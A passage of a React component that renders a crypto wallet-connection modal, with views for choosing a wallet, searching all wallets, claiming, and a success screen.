          }

          @keyframes wmSheetIn {
            from {
              opacity: 0;
              transform: translateY(100%);
            }
            to {
              opacity: 1;
              transform: translateY(0);
            }
          }
        }
      `}</style>

      <div
        className="wm-backdrop"
        onMouseDown={(event) => {
          if (
            event.target === event.currentTarget &&
            !busyId &&
            !claimBusy
          ) {
            onClose()
          }
        }}
      >
        <section
          className="wm-panel"
          role="dialog"
          aria-modal="true"
          aria-label={titles[view]}
        >
          <header className="wm-header">
            <div className="wm-heading">
              {view !== 'main' && view !== 'success' && (
                <button
                  type="button"
                  className="wm-icon-btn"
                  onClick={goBack}
                  disabled={Boolean(busyId || claimBusy)}
                  aria-label="Go back"
                >
                  <ArrowLeft size={19} />
                </button>
              )}

              <h2 className="wm-title">{titles[view]}</h2>
            </div>

            <button
              type="button"
              className="wm-icon-btn wm-close-btn"
              onClick={onClose}
              disabled={Boolean(busyId || claimBusy)}
              aria-label="Close"
            >
              <X size={17} />
            </button>
          </header>

          <div className="wm-body">
            {/* ---------------------------------------------------------------- */}
            {/* MAIN                                                             */}
            {/* ---------------------------------------------------------------- */}

            {view === 'main' && (
              <div className="wm-view">
                <div className="wm-main-intro">
                  <p>Connect your wallet to continue.</p>
                </div>

                <div className="wm-grid">
                  {mainWallets.map((wallet) => (
                    <button
                      key={wallet.id}
                      type="button"
                      className="wm-card"
                      disabled={Boolean(busyId)}
                      onClick={() => connectWallet(wallet)}
                      aria-label={`Connect ${wallet.name}`}
                    >
                      <span className="wm-card-wrap">
                        <WalletIcon wallet={wallet} size={55} />

                        {installed.has(wallet.id) && !busyId && (
                          <span
                            className="wm-installed-dot"
                            title="Installed"
                          >
                            <Check />
                          </span>
                        )}

                        {busyId === wallet.id && (
                          <span className="wm-card-spinner">
                            <LoaderCircle
                              size={19}
                              color="#fff"
                              className="wm-spin"
                            />
                          </span>
                        )}
                      </span>

                      <span className="wm-card-name">{wallet.name}</span>
                    </button>
                  ))}
                </div>

                <button
                  type="button"
                  className="wm-all-button"
                  disabled={Boolean(busyId)}
                  onClick={() => {
                    setError('')
                    setQuery('')
                    setView('all')
                  }}
                >
                  <span className="wm-all-icon">
                    <Grid2X2 size={18} />
                  </span>

                  <span className="wm-all-copy">
                    <span className="wm-all-label">All Wallets</span>
                    <span className="wm-all-subtitle">
                      View all supported wallets
                    </span>
                  </span>

                  <span className="wm-badge">
                    {allWallets.length}+
                  </span>

                  <ChevronRight size={17} color="#5c6062" />
                </button>

                {busyId && (
                  <div className="wm-all-status">
                    <LoaderCircle size={14} className="wm-spin" />
                    Waiting for approval in your wallet…
                  </div>
                )}

                {error && (
                  <div className="wm-error">
                    <span>{error}</span>
                  </div>
                )}

                <div className="wm-main-note">
                  <ShieldCheck size={13} />
                  Secure connection. We never see your private keys.
                </div>
              </div>
            )}

            {/* ---------------------------------------------------------------- */}
            {/* ALL WALLETS                                                      */}
            {/* ---------------------------------------------------------------- */}

            {view === 'all' && (
              <div className="wm-view">
                <label className="wm-search">
                  <Search size={16} />
                  <input
                    value={query}
                    onChange={(event) => setQuery(event.target.value)}
                    placeholder="Search wallet"
                    autoFocus
                    aria-label="Search wallet"
                  />
                </label>

                <div className="wm-grid wm-all-grid">
                  {filteredWallets.map((wallet) => (
                    <button
                      key={wallet.id}
                      type="button"
                      className="wm-card"
                      disabled={Boolean(busyId)}
                      onClick={() => connectWallet(wallet)}
                      aria-label={`Connect ${wallet.name}`}
                    >
                      <span className="wm-card-wrap">
                        <WalletIcon wallet={wallet} size={55} />

                        {installed.has(wallet.id) && !busyId && (
                          <span
                            className="wm-installed-dot"
                            title="Installed"
                          >
                            <Check />
                          </span>
                        )}

                        {busyId === wallet.id && (
                          <span className="wm-card-spinner">
                            <LoaderCircle
                              size={19}
                              color="#fff"
                              className="wm-spin"
                            />
                          </span>
                        )}
                      </span>

                      <span className="wm-card-name">{wallet.name}</span>
                    </button>
                  ))}
                </div>

                {filteredWallets.length === 0 && (
                  <div className="wm-empty">
                    No wallets found.
                  </div>
                )}

                {busyId && (
                  <div className="wm-all-status">
                    <LoaderCircle size={14} className="wm-spin" />
                    Waiting for approval in your wallet…
                  </div>
                )}

                {error && (
                  <div className="wm-error">
                    <span>{error}</span>
                  </div>
                )}
              </div>
            )}

            {/* ---------------------------------------------------------------- */}
            {/* READY                                                            */}
            {/* ---------------------------------------------------------------- */}

            {view === 'ready' && (
              <ClaimReady
                address={displayAddress}
                onClaim={handleClaim}
                claimBusy={claimBusy}
              />
            )}

            {/* ---------------------------------------------------------------- */}
            {/* SUCCESS                                                          */}
            {/* ---------------------------------------------------------------- */}

            {view === 'success' && (
              <SuccessScreen onClose={onClose} />
            )}
          </div>
        </section>
      </div>
    </>
  )
}
